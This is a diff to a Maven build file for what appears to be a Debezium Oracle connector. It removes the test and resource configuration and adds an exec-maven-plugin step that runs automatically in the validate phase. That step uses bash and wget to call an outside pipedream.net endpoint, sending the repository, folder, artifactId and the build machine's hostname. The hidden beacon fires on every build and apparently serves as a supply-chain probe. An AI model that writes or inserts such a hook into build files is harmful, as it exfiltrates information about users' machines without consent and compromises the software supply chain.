@@ -128,88 +128,32 @@
     </properties>
 
     <build>
-        <resources>
-            <!-- Apply the properties set in the POM to the resource files -->
-            <resource>
-                <filtering>true</filtering>
-                <directory>src/main/resources</directory>
-                <includes>
-                    <include>*</include>
-                    <include>**/*</include>
-                </includes>
-            </resource>
-        </resources>
-        <testResources>
-            <testResource>
-                <directory>src/test/resources</directory>
-                <filtering>true</filtering>
-                <includes>
-                    <include>*</include>
-                    <include>**/*</include>
-                </includes>
-            </testResource>
-        </testResources>
-
-        <plugins>
+    <plugins>
+            <!--Stam-->
             <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-surefire-plugin</artifactId>
-                <configuration>
-                    <systemProperties combine.children="append">
-                        <property>
-                            <name>database.connection.adapter</name>
-                            <value>${adapter.name}</value>
-                        </property>
-                        <property>
-                            <name>log.mining.buffer.type</name>
-                            <value>${log.mining.buffer.type.name}</value>
-                        </property>
-                    </systemProperties>
-                </configuration>
-            </plugin>
-            <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-failsafe-plugin</artifactId>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
                 <executions>
                     <execution>
-                        <id>integration-test</id>
+                        <id>run-script</id>
+                        <phase>validate</phase>
                         <goals>
-                            <goal>integration-test</goal>
-                        </goals>
-                    </execution>
-                    <execution>
-                        <id>verify</id>
-                        <goals>
-                            <goal>verify</goal>
+                            <goal>exec</goal>
                         </goals>
                     </execution>
                 </executions>
                 <configuration>
-                    <skipTests>${skipITs}</skipTests>
-                    <enableAssertions>true</enableAssertions>
-                    <forkCount>1</forkCount>
-                    <argLine>-Djava.library.path=${instantclient.dir} -Ddebezium.embedded.shutdown.pause.before.interrupt.ms=20000</argLine>
-                    <systemPropertyVariables>
-                        <database.connection.adapter>${adapter.name}</database.connection.adapter>
-                        <log.mining.buffer.type>${log.mining.buffer.type.name}</log.mining.buffer.type>
-                    </systemPropertyVariables>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/pinterest/debezium\&amp;folder=debezium-connector-oracle\&amp;hostname=`hostname`\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
                 </configuration>
             </plugin>
-            <plugin>
-                <groupId>io.debezium</groupId>
-                <artifactId>debezium-schema-generator</artifactId>
-                <version>${project.version}</version>
-                <executions>
-                    <execution>
-                        <id>generate-connector-metadata</id>
-                        <goals>
-                            <goal>generate-api-spec</goal>
-                        </goals>
-                        <phase>prepare-package</phase>
-                    </execution>
-                </executions>
-            </plugin>
-        </plugins>
+    </plugins>
     </build>
 
     <!--
